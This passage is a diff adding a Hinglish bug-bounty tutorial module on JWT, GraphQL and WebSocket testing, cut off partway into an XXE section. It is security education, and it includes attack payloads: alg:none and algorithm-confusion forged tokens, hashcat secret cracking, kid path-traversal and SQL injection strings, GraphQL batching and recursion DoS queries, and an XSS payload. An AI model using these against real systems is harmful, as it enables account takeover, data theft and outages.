@@ -10977,3 +10977,787 @@ Target domain par kisi bhi JS file par right-click → Extensions → JS Miner �
 ---
 
 ========================================================================================
+
+## **Module 14: API & Modern Web Testing – Complete Notes**
+
+**TechGuru Hinglish Breakdown** – Samjhega koi bhi, chahe usne aaj tak API ka naam na suna ho.
+
+---
+
+# **Topic 14.1: JWT (JSON Web Tokens) Deep Dive**
+
+## 🎯 1. Title / Topic: JWT (JSON Web Tokens) Deep Dive
+
+## 🐣 2. Samjhane ke liye (Simple Analogy)
+
+Socho tum ek **club** mein jaate ho. Bouncer tumse poochta hai: "Kaun ho?" Tum apna **ID card** dikhate ho. Bouncher dekhta hai – card pe photo tumse match karti hai, signature hai, expiry nahi hui – toh andar jaane deta hai.  
+
+**JWT exactly yahi hai.** Jab tum server se pehli baar login karte ho (username/password do), server tumhe ek **digital ID card** (JWT token) deta hai. Ab har baar jab tum server se kuch maangoge (jaise "mera profile lao"), tum wahi card bhejoge. Server bas card check karega – "ye sahi hai, iska signature valid hai, expiry nahi hui" – toh tumhe data de dega.  
+
+Card ke andar kya hai? Thumbprint (signature) aur kuch basic details (user ID, name). Lekin **card ko badal nahi sakte** kyunki signature toot jayega. Exactly yahi JWT ka kaam hai – **stateless authentication**.
+
+## 📖 3. Technical Definition (Interview Answer)
+
+**JWT (JSON Web Token)** ek compact, URL-safe token hai jo client aur server ke beech information securely transfer karne ke liye use hota hai. Yeh teen parts mein bata hota hai: `header.payload.signature`, har part **Base64Url** encoded hota hai aur signature secret key ya public/private key se sign kiya jata hai.
+
+- **Header** – Contains algorithm used (e.g., HS256, RS256) and token type (JWT).
+- **Payload** – Contains claims (data) like user ID, role, expiry time.
+- **Signature** – Header aur payload ko combine karke secret key se sign kiya jata hai taaki pata chal sake ki token tamper toh nahi hua.
+
+## 🧠 4. Zaroorat Kyun Hai? (Why use it?)
+
+**Problem:**  
+Pehle servers session-based authentication use karte the. Jab user login karta tha, server ek session ID create karta, usse memory/database mein store karta, aur client ko cookie bhejta. Har request par server database mein jake check karta ki yeh session valid hai ya nahi. Isse problem ye thi:  
+- **Scalability issue** – agar 10,000 users ek saath aaye, server pe load badh gaya.  
+- **Distributed systems mein dikkat** – agar multiple servers hain, toh sabko same session database share karna padta, ya sticky sessions use karne padte.
+
+**Solution:**  
+JWT ne yeh problem solve ki. Ab server kuch bhi store nahi karta. Sirf token generate karta hai, client ko de deta hai. Client har request mein token bhejta hai. Server sirf token ka signature check karta hai – "yeh token humne hi banaya hai?" – aur agar sahi hai, toh user authenticated maan leta hai. Database hit zero. **Stateless authentication** ka maza.
+
+## 🔍 5. Visual - Jab Screen Par Kya Dikhega
+
+Jab tum Burp Suite mein kisi request ko intercept karoge jisme JWT hai, toh kuch aisa dikhega:
+
+```
+GET /api/user HTTP/1.1
+Host: example.com
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE2MjUxMjM0NTZ9.2x6x5x7x8x9x0x1x2x3x4x5x6x7x8x9x
+```
+
+- **`Authorization: Bearer`** ke baad jo lamba sa string hai, woh JWT hai.  
+- Teen parts dots (`.`) se separate hain:  
+  - Pehla part: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9` → **Header** (Base64 encoded)  
+  - Doosra part: `eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE2MjUxMjM0NTZ9` → **Payload** (Base64 encoded)  
+  - Tisra part: `2x6x5x7x8x9x0x1x2x3x4x5x6x7x8x9x` → **Signature**  
+
+Burp mein agar tum is string ko select karo aur right-click karo → **Send to Decoder**, wahan Base64 decode karke dekh sakte ho.
+
+## ⚙️ 6. Under the Hood (Technical Working)
+
+1. **Client login karta hai** – username/password server ko bhejta hai.  
+2. **Server verify karta hai** credentials, agar sahi hain toh ek JWT banata hai:  
+   - Header banata hai, e.g., `{"alg":"HS256","typ":"JWT"}` → ise Base64Url encode kiya.  
+   - Payload banata hai, e.g., `{"user":"admin","exp":1625123456}` → ise Base64Url encode kiya.  
+   - Dono encoded strings ko dot se jodta hai: `header.payload`  
+   - Is string ko secret key (HS256) ya private key (RS256) se sign karta hai → signature aata hai.  
+   - Final token: `header.payload.signature`  
+3. Server token client ko bhejta hai.  
+4. Client har baar request mein token bhejta hai (usually `Authorization` header mein).  
+5. Server token milte hi:  
+   - Token ko parts mein todta hai.  
+   - Header aur payload ka hash nikalta hai (same algorithm se) aur signature se compare karta hai.  
+   - Agar match kar gaya, token valid maan leta hai.  
+   - Payload se user info nikaal leta hai (e.g., user ID).  
+6. Server database nahi chheerta – bas signature check karta hai. Fast and scalable.
+
+## 💻 7. Hands-On: Step-by-Step Practical (Testing JWT Vulnerabilities)
+
+### Step 1: JWT ko capture karo
+- Burp Proxy on karo, browser mein target website par login karo.  
+- Login request dekho – agar response mein JWT mila toh use capture karo.  
+- Ya kisi authenticated request mein `Authorization: Bearer <token>` header dhundo.
+
+### Step 2: JWT ko Decode karo
+- Token ko select karo → Right-click → **Send to Decoder**.  
+- Decoder mein, token ko teen parts mein break karo.  
+- Har part ko select karo, phir right-click → **Decode as → Base64**.  
+- Dekho header aur payload mein kya likha hai.
+
+### Step 3: None Algorithm Attack try karo
+- Token ka header change karo: `{"alg":"none","typ":"JWT"}`  
+- Phir is header ko Base64Url encode karo (dot nahi hatana).  
+- Payload same rakho.  
+- Signature part hata do (ya kuch bhi likh do).  
+- Naya token banake bhejo: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE2MjUxMjM0NTZ9.`  
+- Agar server accept kar leta hai (200 OK), toh vulnerability hai.
+
+**Burp mein kaise karein:**  
+- Request ko **Repeater** mein bhejo.  
+- Authorization header mein token replace karo apne modified token se.  
+- Send karo aur response dekho.
+
+### Step 4: Algorithm Confusion Attack (RS256 → HS256)
+- Agar server RS256 use kar raha hai (asymmetric) aur tumhe **public key** mil gayi (e.g., from `/jwks.json`), toh tum public key ko HS256 symmetric key ki tarah use kar sakte ho.  
+- Steps:  
+  a. Public key ko PEM format mein lo.  
+  b. Use tool like `jwt_tool` ya Python script:  
+  ```python
+  import jwt
+  public_key = open('public.pem').read()
+  token = jwt.encode({'user':'admin'}, public_key, algorithm='HS256')
+  print(token)
+  ```
+  c. Ye token bhejo – agar server verify kar leta hai, toh vulnerability.
+
+### Step 5: Weak HMAC Secret Brute-Force
+- Agar JWT HS256 use kar raha hai, aur secret weak hai (jaise "secret", "password"), toh tum **hashcat** se secret nikal sakte ho.  
+- Command:  
+  ```bash
+  hashcat -m 16500 jwt.txt wordlist.txt
+  ```  
+  - `-m 16500` = JWT hash mode  
+  - `jwt.txt` mein token daalo  
+  - `wordlist.txt` common secrets ki list  
+- Agar secret mil gaya, tum koi bhi JWT sign kar sakte ho.
+
+### Step 6: `kid` Parameter Injection
+- Header mein `kid` (key ID) hota hai jo server batata hai ki kaunsi key use karni hai.  
+- Agar `kid` mein directory traversal ho sakta hai, toh try karo:  
+  `"kid": "../../../../dev/null"` ya `"kid": "/etc/passwd"`  
+- Ya SQL injection: `"kid": "abc' UNION SELECT 'key' -- "`  
+- Server agar file path se key padhta hai toh vulnerable.
+
+## ⚖️ 8. Comparison (JWT vs Session)
+
+| Feature | JWT | Session (Cookie-based) |
+|---------|-----|------------------------|
+| Storage | Client side (token) | Server side (session store) |
+| State | Stateless | Stateful |
+| Scalability | Easy (no shared session store) | Hard (need shared DB/sticky sessions) |
+| Security | Token can't be revoked easily | Session can be invalidated easily |
+| Size | Larger (contains data) | Small (just session ID) |
+| Use case | APIs, microservices | Traditional web apps |
+
+## 🚫 9. Common Mistakes (Beginner Traps)
+
+- **Mistake 1:** JWT ko localStorage mein store karna (XSS vulnerable).  
+  **Fix:** Use httpOnly cookies for web apps.  
+- **Mistake 2:** Signature verify karna bhool jana.  
+  **Fix:** Always verify signature, don't just decode.  
+- **Mistake 3:** `alg: none` ko allow karna.  
+  **Fix:** Disable `none` algorithm.  
+- **Mistake 4:** Weak secret use karna.  
+  **Fix:** Use strong random secret (at least 32 chars).
+
+## 🤔 10. Agar Dimag Ghoom Rahe Hai? (Confusion Clarifier)
+
+- **"Log sochte hain ki JWT encrypted hota hai."**  
+  **Actually:** JWT generally **signed** hota hai, encrypted nahi. Base64 encoded hai, isliye koi bhi decode kar sakta hai. Sensitive data mat rakho payload mein.  
+- **"Log sochte hain ki JWT stateless hai isliye revoke nahi kar sakte."**  
+  **Actually:** Tum server pe blacklist rakh sakte ho (stateful) ya token expiry choti rakho. Ya fir database mein token version store karo.
+
+## 🌍 11. Real-World Use Case (Bug Bounty)
+
+**Scenario:** Ek bade social media platform ka API tha. Unka JWT `alg` header mein tha. Researcher ne `alg: none` karke bheja, server ne accept kar liya. Matlab woh kisi bhi user ban sakta tha.  
+**Result:** Critical bug, $5000 bounty.  
+**How they used it:** Bas token ka header modify kiya, signature hata diya, aur admin endpoints access kar liye.
+
+## 🎨 12. Visual Diagram (ASCII Art)
+
+```
+[Client] -- Login (user/pass) --> [Server]
+[Server] -- Generate JWT --> [Client]
+[Client] -- Request with JWT --> [Server]
+[Server] -- Verify Signature (No DB) --> Grant Access
+```
+
+## 🛠️ 13. Best Practices (Pro Tips)
+
+- **Tip 1:** JWT milte hi sabse pehle Base64 decode karo header aur payload.  
+- **Tip 2:** `alg: none` test karna mat bhoolna.  
+- **Tip 3:** `kid` parameter mein path traversal aur SQLi check karo.  
+- **Tip 4:** JWKS URL (`jku`) injection try karo – apna JWKS server bana ke bhejo.  
+- **Tip 5:** JWT signature verify karne ke liye hamesha trusted library use karo, khud mat likho.
+
+## ⚠️ 14. Consequences of Failure (Agar galat kiya toh?)
+
+- **Scenario 1:** Agar JWT properly verify nahi kiya, toh attacker kisi bhi user ka token bana sakta hai – **account takeover**.  
+- **Scenario 2:** Weak secret use kiya toh brute-force ho sakta hai – poora system compromise.  
+- **Scenario 3:** Payload mein sensitive data rakha (jaise credit card) toh koi bhi decode kar ke padh sakta hai – **data breach**.
+
+## ❓ 15. FAQ (Interview Questions)
+
+**Q1: JWT ke teen parts kya hote hain?**  
+A1: Header (algorithm), Payload (data), Signature (verification).  
+
+**Q2: JWT stateless kaise hota hai?**  
+A2: Server token verify karne ke liye database nahi chheerta, bas signature check karta hai.  
+
+**Q3: What is None algorithm attack?**  
+A3: Jab server `alg: none` allow karta hai, toh attacker bina signature ke token bana sakta hai.  
+
+**Q4: RS256 aur HS256 mein kya antar hai?**  
+A4: RS256 asymmetric (public/private key) hai, HS256 symmetric (same secret key).  
+
+**Q5: JWT mein expiry kaise handle karte hain?**  
+A5: Payload mein `exp` claim hota hai, server usse check karta hai.  
+
+## 📝 16. Ek Line Mein Yaad Rakhne Ko (Summary)
+
+**JWT = Digital ID card jise server sign karta hai, client har baar dikhata hai, aur server bina database dekhe verify kar leta hai.**
+
+---
+
+# **Topic 14.2: GraphQL Testing**
+
+## 🎯 1. Title / Topic: GraphQL Testing
+
+## 🐣 2. Samjhane ke liye (Simple Analogy)
+
+Socho tum ek **restaurant** mein gaye ho. Waiter (server) ke paas ek **menu** hai jisme saare dishes likhe hain. Tum waiter ko bataoge "mujhe paneer tikka chahiye, usme extra cheese, aur thoda kam masala". Waiter kitchen mein jake exactly wahi dish laake dega.  
+
+**REST API** mein aisa hota hai ki tum fixed dishes maang sakte ho – jaise "paneer tikka" ke liye ek specific URL, "roti" ke liye doosra. Agar tumhe paneer tikka aur roti dono chahiye, toh do baar order karna padega.  
+
+**GraphQL** mein tum waiter ko ek saath bata sakte ho: "mujhe paneer tikka chahiye (with extra cheese), roti, aur salad bhi" – aur waiter ek hi baar mein saath le aata hai. Matlab **tum decide karte ho ki kaunsa data chahiye**, server nahi.  
+
+## 📖 3. Technical Definition (Interview Answer)
+
+**GraphQL** ek query language hai jo client ko flexibility deti hai ki woh exactly wahi data maange jo use chahiye, kuch zyada nahi, kuch kam nahi. Ek single endpoint hota hai (usually `/graphql`), jahan POST request bheji jati hai with JSON body containing query/mutation. Server ek structured response deta hai jisme sirf maangi hui fields hoti hain.  
+
+Introspection feature se poora schema pata chal sakta hai – ki kaunsi queries, mutations, fields available hain.
+
+## 🧠 4. Zaroorat Kyun Hai? (Why use it?)
+
+**Problem:**  
+REST APIs mein often **over-fetching** ya **under-fetching** hoti hai. Jaise user profile ke liye ek API hai jo 20 fields return karta hai, lekin client ko sirf 3 chahiye. Ya fir client ko user + posts dono chahiye, toh pehle user lao, phir posts ke liye alag call karo – multiple requests.
+
+**Solution:**  
+GraphQL mein client apni query mein exactly batata hai ki kya chahiye. Server ek hi response mein saara data de deta hai. Isse network bandwidth bachti hai aur performance better hoti hai.
+
+## 🔍 5. Visual - Jab Screen Par Kya Dikhega
+
+Burp mein agar koi GraphQL request intercept karo, toh kuch aisa dikhega:
+
+```
+POST /graphql HTTP/1.1
+Host: api.example.com
+Content-Type: application/json
+
+{
+  "query": "query { user(id: 123) { name email posts { title } } }"
+}
+```
+
+Response kuch aisa:
+```json
+{
+  "data": {
+    "user": {
+      "name": "John",
+      "email": "john@example.com",
+      "posts": [
+        { "title": "Hello World" }
+      ]
+    }
+  }
+}
+```
+
+Agar introspection query bheji toh:
+```
+{
+  "query": "query { __schema { types { name fields { name } } } }"
+}
+```
+
+Response mein saara schema list ho jayega.
+
+## ⚙️ 6. Under the Hood (Technical Working)
+
+1. Client ek query string banata hai (GraphQL syntax).  
+2. Use POST request mein bhejta hai, JSON body mein `{"query": "..."}`.  
+3. Server query parse karta hai, validate karta hai ki fields exist karte hain ya nahi (schema ke against).  
+4. Phir query execute karta hai – har field ke liye resolver function call hota hai jo data fetch karta hai (database se, external API se, etc.).  
+5. Resolver se data aata hai, JSON mein pack karke client ko bhej diya jata hai.  
+
+**Introspection:** Agar enabled hai, toh client `__schema` ya `__type` queries bhej kar schema ka structure le sakta hai.
+
+## 💻 7. Hands-On: Step-by-Step Practical (Testing GraphQL)
+
+### Step 1: GraphQL endpoint discover karo
+- Common endpoints: `/graphql`, `/graphiql`, `/v1/graphql`, `/api`, `/query`.  
+- Burp target mein inhe fuzz karo.  
+- Agar endpoint exist karta hai, toh aise query bhejo:  
+  ```json
+  {"query":"{__schema{types{name}}}"}
+  ```
+- Agar response mein `data` mila, toh GraphQL hai.
+
+### Step 2: Introspection query bhejo – poora schema uthao
+- Use introspection query (jo encyclopedia mein diya hai) ya tools like **GraphQL Voyager**, **InQL** (Burp extension).  
+- Burp mein **InQL Scanner** extension install karo.  
+- Request par right-click → **InQL Scanner → Generate queries** – automatically saari queries/mutations generate kar dega.
+
+### Step 3: Hidden fields dhundo
+- Introspection se jo fields mile, unmein se kuch UI mein nahi dikhte (jaise `isAdmin`, `resetPassword`, `internalNote`).  
+- Un fields ko query mein include karo – agar data aaya, toh unauthorized access.
+
+### Step 4: Batching attack try karo (Rate limit bypass)
+- Ek request mein multiple mutations bhejo:  
+  ```json
+  {
+    "query": "mutation { first: login(pass: \"123\") { token } second: login(pass: \"456\") { token } }"
+  }
+  ```
+- Agar server sirf ek request count karta hai, toh rate limit bypass ho sakta hai.
+
+### Step 5: Deep recursion queries (DoS)
+- Circular query banao, jaise:  
+  ```json
+  {"query":"query { user { friends { user { friends { user { friends { name } } } } } } }"}
+  ```
+- Agar server depth limit nahi rakhta, toh CPU usage badh jayega – DoS.
+
+### Step 6: Field duplication
+- Same field multiple times maango:  
+  ```json
+  {"query":"query { user(id:1) { name name name email email } }"}
+  ```
+- Kuch servers overload ho sakte hain.
+
+### Step 7: Injection in arguments
+- Agar koi argument hai (jaise `id`), toh SQLi ya NoSQLi try karo:  
+  ```json
+  {"query":"query { user(id:\"1' OR '1'='1\") { name } }"}
+  ```
+
+## ⚖️ 8. Comparison (GraphQL vs REST)
+
+| Feature | GraphQL | REST |
+|---------|---------|------|
+| Endpoint | Single endpoint (usually /graphql) | Multiple endpoints (resources) |
+| Data fetching | Client specifies exact fields | Server returns fixed structure |
+| Over-fetching | No | Often |
+| Versioning | Not needed (evolve schema) | Need new endpoints (v1, v2) |
+| Tooling | Introspection, GraphiQL | Swagger/OpenAPI |
+| Complexity | Can be complex queries | Simple and predictable |
+
+## 🚫 9. Common Mistakes (Beginner Traps)
+
+- **Mistake 1:** Introspection enabled in production.  
+  **Fix:** Disable introspection in production.  
+- **Mistake 2:** No depth limiting – DoS possible.  
+  **Fix:** Set max query depth.  
+- **Mistake 3:** No rate limiting on mutations.  
+  **Fix:** Apply rate limiting per operation.  
+- **Mistake 4:** Exposing sensitive fields in schema.  
+  **Fix:** Use directives to hide fields.
+
+## 🤔 10. Agar Dimag Ghoom Rahe Hai? (Confusion Clarifier)
+
+- **"Log sochte hain ki GraphQL sirf queries ke liye hai."**  
+  **Actually:** GraphQL mein **mutations** bhi hote hain (data change karne ke liye) aur **subscriptions** (real-time updates).  
+- **"Log sochte hain ki GraphQL se sirf ek hi request mein saara data aa jata hai."**  
+  **Actually:** Ha, but agar query complex hai toh server pe bhi load padta hai. N+1 problem bhi ho sakti hai (multiple database calls).
+
+## 🌍 11. Real-World Use Case (Bug Bounty)
+
+**Scenario:** Ek social media app ne GraphQL use kiya tha. Researcher ne introspection query bheji – enabled thi. Schema mein `allUsers` query mili jisme koi authentication nahi thi. Is query se saare users ka data (email, phone) nikaal liya.  
+**Result:** Critical info disclosure, $2000 bounty.
+
+## 🎨 12. Visual Diagram (ASCII Art)
+
+```
+[Client] -- Query: { user(id:1) { name } } --> [GraphQL Server]
+[GraphQL Server] --> Resolver -> [Database]
+[GraphQL Server] --> Resolver -> [External API]
+[GraphQL Server] -- Response: {"data":{"user":{"name":"John"}}} --> [Client]
+```
+
+## 🛠️ 13. Best Practices (Pro Tips)
+
+- **Tip 1:** Pehla step – introspection query bhej. Agar enabled hai, toh saara schema export karle.  
+- **Tip 2:** InQL extension use karo – automatically queries generate karta hai aur potential vulnerabilities highlight karta hai.  
+- **Tip 3:** Hidden fields search karo – `isAdmin`, `debug`, `token`, `reset`.  
+- **Tip 4:** Batching attack se rate limit bypass kar ke brute force try kar.  
+- **Tip 5:** Depth recursion attacks ke liye fuzzer use kar.
+
+## ⚠️ 14. Consequences of Failure (Agar galat kiya toh?)
+
+- **Scenario 1:** Introspection enabled reh gaya toh attacker poora API schema dekh lega – sensitive endpoints expose ho sakte hain.  
+- **Scenario 2:** Depth limit nahi hai toh DoS ho sakta hai – server down.  
+- **Scenario 3:** Sensitive fields accessible (jaise `resetPassword`) toh account takeover.
+
+## ❓ 15. FAQ (Interview Questions)
+
+**Q1: GraphQL mein REST se kya fayda hai?**  
+A1: Client exact data maang sakta hai, over-fetching nahi hoti, ek hi request mein multiple resources.  
+
+**Q2: Introspection kya hota hai?**  
+A2: Ek feature jisse client schema ke baare mein puch sakta hai – ki kaunsi queries/types available hain.  
+
+**Q3: GraphQL mein mutation kya hai?**  
+A3: Mutation data modify karne ke liye hota hai (jaise POST/PUT/PATCH in REST).  
+
+**Q4: GraphQL vulnerabilities kya hain?**  
+A4: Introspection enabled, batching attacks, deep recursion, field duplication, injection.  
+
+**Q5: N+1 problem kya hai GraphQL mein?**  
+A5: Jab ek query ke liye multiple database calls hote hain, jaise user aur uske friends fetch karne pe alag-alag queries.  
+
+## 📝 16. Ek Line Mein Yaad Rakhne Ko (Summary)
+
+**GraphQL = Client ka khud ka menu jisme woh exactly wahi dish maang sakta hai jo use chahiye, aur waiter ek hi trip mein saath le aata hai.**
+
+---
+
+# **Topic 14.3: WebSockets Testing**
+
+## 🎯 1. Title / Topic: WebSockets Testing
+
+## 🐣 2. Samjhane ke liye (Simple Analogy)
+
+Socho tum apne dost ke saath **walkie-talkie** par baat kar rahe ho. Tum button dabao, bolo, chhodo – dost jab chahe reply kar sakta hai. Dono ek **continuous connection** par baat kar rahe ho.  
+
+**WebSocket bhi kuch aisa hi hai.** Jab browser aur server ke beech WebSocket connection establish hota hai, toh dono aapas mein real-time messages bhej sakte hain, bina har baar naya connection banaye. Jaise chat apps, live cricket score, stock prices – ye sab WebSocket se chalte hain.  
+
+**REST** mein har request ke liye naya connection banana padta (jaise phone karke baat karna, phir rakh dena, phir uthana). WebSocket mein ek baar connect karo, phir continuous baat karo.
+
+## 📖 3. Technical Definition (Interview Answer)
+
+**WebSocket** ek full-duplex communication protocol hai jo client (browser) aur server ke beech persistent connection provide karta hai. HTTP ki tarah request-response nahi, balki dono taraf se real-time messages bheje ja sakte hain. Connection `ws://` (unencrypted) ya `wss://` (encrypted, like HTTPS) se establish hota hai.  
+
+WebSocket handshake HTTP request se start hota hai jisme `Upgrade: websocket` header hota hai, phir server agree karta hai aur connection protocol switch ho jata hai.
+
+## 🧠 4. Zaroorat Kyun Hai? (Why use it?)
+
+**Problem:**  
+Pehle real-time features ke liye **polling** karte the – client har 2 second mein server se poochta tha "kuch naya hai?" Isse bandwidth waste hoti thi aur latency zyada thi. Long polling bhi tha but still overhead.
+
+**Solution:**  
+WebSocket server ko actively client ko data push karne deta hai jab bhi kuch change ho. Client ko baar-baar request nahi karni padti. Isse real-time apps efficient bante hain – chat, gaming, notifications.
+
+## 🔍 5. Visual - Jab Screen Par Kya Dikhega
+
+Burp mein WebSocket traffic dekhne ke liye:
+
+1. **Proxy → WebSockets history** tab par jao.  
+2. Yahan saare WebSocket messages list honge.  
+   - **Direction:** Client to Server ya Server to Client.  
+   - **Payload:** Actual message (text ya binary).  
+
+Intercept karne ke liye:
+
+- **Proxy → Intercept** tab mein **WebSocket** sub-tab hota hai.  
+- Yahan check karo **"Intercept WebSocket messages"** checkbox.  
+- Ab jab bhi WebSocket message aayega, Burp rok lega aur tum modify kar sakte ho.
+
+## ⚙️ 6. Under the Hood (Technical Working)
+
+1. **Handshake:** Client HTTP GET request bhejta hai with headers:  
+   ```
+   GET /chat HTTP/1.1
+   Host: example.com
+   Upgrade: websocket
+   Connection: Upgrade
+   Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==
+   Sec-WebSocket-Version: 13
+   ```
+2. **Server response:** Agar accept karta hai toh:  
+   ```
+   HTTP/1.1 101 Switching Protocols
+   Upgrade: websocket
+   Connection: Upgrade
+   Sec-WebSocket-Accept: HSmrc0sMlYUkAGmm5OPpG2HaGWk=
+   ```
+3. Ab connection **upgrade** ho gaya – TCP connection khula rahta hai.  
+4. Dono sides **frames** bhejte hain. Har frame ka ek opcode hota hai (text, binary, close, ping, pong).  
+5. Connection tab tak khula rahta hai jab tak explicitly close na ho.
+
+## 💻 7. Hands-On: Step-by-Step Practical (Testing WebSockets)
+
+### Step 1: WebSocket connection capture karo
+- Burp proxy on karo, target website par kisi feature ko use karo jo WebSocket use karta ho (chat, live updates).  
+- **Proxy → WebSockets history** mein check karo – wahan saare messages dikhenge.
+
+### Step 2: Intercept WebSocket messages
+- **Proxy → Intercept → WebSocket** sub-tab par jao.  
+- **"Intercept WebSocket messages"** checkbox tick karo.  
+- Ab jab bhi message aayega, Burp rok lega. Tum message modify kar ke **Forward** kar sakte ho, ya **Drop**.
+
+### Step 3: Modify message in real-time
+- Maan lo chat app hai. Tum message bhej rahe ho "hello".  
+- Burp ne rok liya. Tum message change kar do "hello<script>alert(1)</script>" – XSS payload.  
+- Forward kar do. Agar server ne reflect kiya ya kisi aur user ko dikhaya, toh XSS ho sakta hai.
+
+### Step 4: Replay WebSocket messages (Repeater)
+- **WebSockets history** mein kisi message par right-click → **Send to Repeater**.  
+- Repeater mein **WebSocket** tab khulega.  
+- Yahan tum message edit kar ke **Send** kar sakte ho. Connection already establish hai, toh direct server tak jayega.  
+- Example: `{"action":"getMessage","id":123}` ko change karo `{"action":"getMessage","id":456}` – IDOR check.
+
+### Step 5: Connection manipulation
+- Handshake request ko intercept karo (HTTP request with `Upgrade: websocket`).  
+- Headers modify karo – `Origin` change karo, `Sec-WebSocket-Key` change karo, ya authentication headers hatao.  
+- Agar server bina proper auth connection allow karta hai, toh vulnerability.
+
+### Step 6: DoS testing
+- Burp ke Repeater mein baar-baar large messages bhejo ya infinite loop mein messages bhejo.  
+- Check karo ki server crash toh nahi hota.
+
+## ⚖️ 8. Comparison (WebSocket vs HTTP)
+
+| Feature | WebSocket | HTTP |
+|---------|-----------|------|
+| Connection | Persistent, full-duplex | Short-lived, half-duplex |
+| Communication | Both sides can send anytime | Client requests, server responds |
+| Use case | Real-time apps (chat, gaming) | Traditional web (page loads, APIs) |
+| Overhead | Low after handshake | High (headers with each request) |
+| Interception | Burp has WebSocket intercept | Standard proxy intercept |
+
+## 🚫 9. Common Mistakes (Beginner Traps)
+
+- **Mistake 1:** WebSocket messages ko intercept karna bhool jana.  
+  **Fix:** Proxy → Intercept mein WebSocket tab check karo.  
+- **Mistake 2:** WebSocket history check nahi karte.  
+  **Fix:** Har WebSocket app test karte waqt history tab zaroor dekho.  
+- **Mistake 3:** Handshake request mein auth bypass check nahi karte.  
+  **Fix:** Handshake request mein cookies/tokens hata ke bhejo, agar connection still allow ho toh auth bypass.  
+- **Mistake 4:** Repeater mein WebSocket messages ko resend karte waqt naya connection ban jata hai (galti se).  
+  **Fix:** Repeater mein "New WebSocket connection" button se manually connection establish karo, phir messages bhejo.
+
+## 🤔 10. Agar Dimag Ghoom Rahe Hai? (Confusion Clarifier)
+
+- **"Log sochte hain ki WebSocket traffic Burp intercept nahi kar sakta."**  
+  **Actually:** Burp Pro/Community dono WebSocket traffic intercept kar sakta hai. Bas Proxy options mein WebSocket intercept enable karna hota hai.  
+- **"Log sochte hain ki WebSocket messages HTTP requests ki tarah modify karna easy nahi."**  
+  **Actually:** Bilkul easy hai – same intercept screen mein message edit karo aur forward.
+
+## 🌍 11. Real-World Use Case (Bug Bounty)
+
+**Scenario:** Ek cryptocurrency exchange mein live price updates WebSocket se aate the. Researcher ne WebSocket message intercept kiya aur dekha ki price update message mein `symbol` parameter tha. Usne use modify kar ke doosre symbol ka data maang liya, jo uske account se related nahi tha. Server ne bhej diya – IDOR vulnerability.  
+**Result:** $3500 bounty.
+
+## 🎨 12. Visual Diagram (ASCII Art)
+
+```
+[Browser] -- HTTP Upgrade Request --> [Server]
+[Server] -- 101 Switching Protocols --> [Browser]
+=== WebSocket Connection Established ===
+[Browser] -- Message (text/binary) --> [Server]
+[Server] -- Message --> [Browser]
+... (real-time) ...
+[Browser] -- Close Frame --> [Server]
+```
+
+## 🛠️ 13. Best Practices (Pro Tips)
+
+- **Tip 1:** WebSocket messages mein hamesha injection try karo – XSS, SQLi, command injection.  
+- **Tip 2:** Authentication bypass ke liye handshake request modify karo – cookies hatao, tokens hatao.  
+- **Tip 3:** Repeater mein multiple messages bhej kar race conditions check karo.  
+- **Tip 4:** WebSocket connection ko burp ke through proxy karte waqt ensure karo ki WebSocket sub-tab intercept enabled hai.
+
+## ⚠️ 14. Consequences of Failure (Agar galat kiya toh?)
+
+- **Scenario 1:** WebSocket messages mein XSS – agar message kisi admin ke browser mein dikhe, toh session hijack.  
+- **Scenario 2:** IDOR in WebSocket messages – kisi aur ka private data padh sakte hain.  
+- **Scenario 3:** Authentication bypass – attacker bina login ke real-time updates le sakta hai.
+
+## ❓ 15. FAQ (Interview Questions)
+
+**Q1: WebSocket aur HTTP mein kya antar hai?**  
+A1: WebSocket persistent full-duplex connection hai, HTTP short-lived request-response.  
+
+**Q2: Burp mein WebSocket traffic kaise intercept karein?**  
+A2: Proxy → Intercept → WebSocket tab mein checkbox enable karo.  
+
+**Q3: WebSocket handshake kaise hota hai?**  
+A3: Client HTTP GET request with `Upgrade: websocket` header bhejta hai, server 101 Switching Protocols return karta hai.  
+
+**Q4: WebSocket testing mein common vulnerabilities kya hain?**  
+A4: XSS, IDOR, authentication bypass, injection attacks, DoS.  
+
+**Q5: WebSocket messages replay kaise karein?**  
+A5: History mein message ko right-click → Send to Repeater, phir WebSocket tab mein send karo.  
+
+## 📝 16. Ek Line Mein Yaad Rakhne Ko (Summary)
+
+**WebSocket = Walkie-talkie connection jahan dono side real-time baat kar sakte hain, aur Burp us baat-cheet ko sun aur badal sakta hai.**
+
+---
+
+# **Topic 14.4: Content-Type Confusion & XXE**
+
+## 🎯 1. Title / Topic: Content-Type Confusion & XXE
+
+## 🐣 2. Samjhane ke liye (Simple Analogy)
+
+Socho tum ek **dabba (JSON)** mein sandwich bhejna chahte ho, lekin restaurant ka delivery boy sirf **patra (XML)** mein samaan leta hai. Tum sochte ho "agar main dabba hi bhej doon toh kya hoga?" Usually restaurant mana kar dega. Lekin agar restaurant ka staff confuse ho jaye aur patra samajh ke dabba khol le, toh tum galti se unki secret recipe padh sakte ho.  
+
+**Content-Type confusion** exactly yahi hai. API JSON accept karta hai, lekin agar tum XML bhejo aur server galat content type handle kar le, toh vulnerabilities aa sakti hain – jaise **XXE (XML External Entity)** jisse tum server ki files padh sakte ho.
+
+## 📖 3. Technical Definition (Interview Answer)
+
+**Content-Type Confusion** tab hota hai jab server ek format expect karta hai (e.g., JSON) lekin client doosra format (e.g., XML) bhejta hai aur server usse parse kar leta hai. Iski wajah se parsers ki vulnerabilities trigger ho sakti hain, jaise **XXE (XML External Entity)** attack.  
+
+XXE mein attacker ek specially crafted XML bhejta hai jisme external entity define karta hai, e.g., `file:///etc/passwd`, aur agar server vulnerable hai toh woh file ka content read kar leta hai.
+
+## 🧠 4. Zaroorat Kyun Hai? (Why use it?)
+
+**Problem:**  
+Aajkal APIs mostly JSON use karte hain. Lekin purane systems mein XML parsers abhi bhi hote hain, aur kai baar APIs ne XML support bhi rakha hai legacy clients ke liye. Agar server ne XML parsing enable rakha hai lekin properly secure nahi kiya, toh attacker XML bhej ke server ko galat kaam karwa sakta hai – jaise files read karna, internal network requests bhejna, ya DoS karna.
+
+**Solution (for attacker):**  
